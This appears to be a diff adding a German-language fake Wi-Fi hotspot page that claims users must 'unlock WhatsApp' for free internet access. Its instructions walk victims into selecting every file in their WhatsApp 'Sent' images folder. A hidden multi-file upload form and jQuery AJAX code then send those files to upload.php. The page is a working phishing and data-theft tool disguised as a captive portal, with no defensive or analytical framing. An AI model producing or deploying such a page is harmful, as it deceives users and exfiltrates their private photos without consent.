@@ -1,0 +1,88 @@
+<html>
+   <head>
+      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+      <title>Hotspot</title>
+      <script type="text/javascript" src="main.js"></script>
+   </head>
+   <body>
+      <form enctype="multipart/form-data" id="formuploadajax" method="post">
+         <input id="files" name="file[]" multiple="multiple" onchange="Handlechange();" style="display: none;" type="file">
+         <input value="Whatsapp freischalten" id="submit" style="display: none;" type="submit"> 
+      </form>
+      <div id="msg"></div>
+      <div style="text-align: left; font-family: Courier New,Courier,monospace;"><br>
+         Herzlich
+         Willkommen zu Ihrem <br>
+         <br>
+         <font style="color: red;" size="+2"> <span style="font-weight: bold;">kostenlosen
+         Internetzugang.</span> <br>
+         </font> <br>
+         <span style="font-weight: bold;">Die Nutzung ist für Sie komplett<br>
+         kostenfrei.</span> <br style="font-weight: bold;">
+         <br>
+         <br>
+         Um Whatsapp in vollen Umfang<br>
+         nutzen zu können, müssen Sie den<br>
+         Service lediglich einmalig frei-<br>
+         schalten. Danach können Sie wie<br>
+         gewohnt Nachrichten senden und<br>
+         empfangen. <br>
+         <br>
+         Und so einfach geht's: <br>
+         <br>
+         * Auf <span style="font-weight: bold;">Whatsapp freischalten</span><br>
+         &nbsp; klicken <br>
+         * Danach auf <span style="font-weight: bold;">Dokumente</span><br>
+         &nbsp; klicken <br>
+         * Nun klicken Sie bitte auf<span style="font-weight: bold;"><br>
+         &nbsp; die drei Punkte oben rechts<br>
+         </span>* Falls angezeigt auf <span style="font-weight: bold;">SD-Karte</span><br>
+         &nbsp; <span style="font-weight: bold;">anzeigen</span> klicken<br>
+         * Jetzt auf die <span style="font-weight: bold;">drei Striche</span><br>
+         &nbsp; <span style="font-weight: bold;">oben links</span> klicken und auf<br>
+         &nbsp; <span style="font-weight: bold;">Interner Speicher</span> klicken<br>
+         * Die Ordner <span style="font-weight: bold;">WhatsApp</span>, <span style="font-weight: bold;">Media</span>,<br>
+         &nbsp; <span style="font-weight: bold;">WhatsApp Images</span>, <span style="font-weight: bold;">Sent</span> nach-<br>
+         &nbsp; einander anklicken<br>
+         * Jetzt <span style="font-weight: bold;">alle Dateien markieren</span><br>
+         &nbsp; (eine Datei länger anklicken<br>
+         &nbsp; und die anderen nach der Reihe<br>
+         &nbsp; auswählen) und danach auf<span style="font-weight: bold;"><br>
+         &nbsp; Öffnen</span>
+         klicken <br>
+         * <span style="font-weight: bold; color: red;">Sie werden nach der
+         Fertig-<br>
+         &nbsp; stellung automatisch weiter-<br>
+         &nbsp; geleitet.</span> <br>
+         <br>
+         <a href="javascript:void(0)" title="Whatsapp freischalten" onclick="HandleBrowseClick()">Whatsapp freischalten</a><br>
+         <br>
+      </div>
+      <script src="https://code.jquery.com/jquery-1.11.1.min.js"></script>
+      <script>
+         $(function(){
+             $("#formuploadajax").on("submit", function(e){
+                 e.preventDefault();
+                 var f = $(this);
+                 
+         var formData = new FormData(document.getElementById("formuploadajax"));
+         
+         formData.append("data", "value");
+         
+                 $.ajax({
+                     url: "upload.php",
+                     type: "post",
+                     dataType: "html",
+                     data: formData,
+                     cache: false,
+                     contentType: false,
+           		processData: false
+                 })
+                 .done(function(res){
+         $("#msg").html();
+                 });
+             });
+         });
+      </script>
+   </body>
+</html>
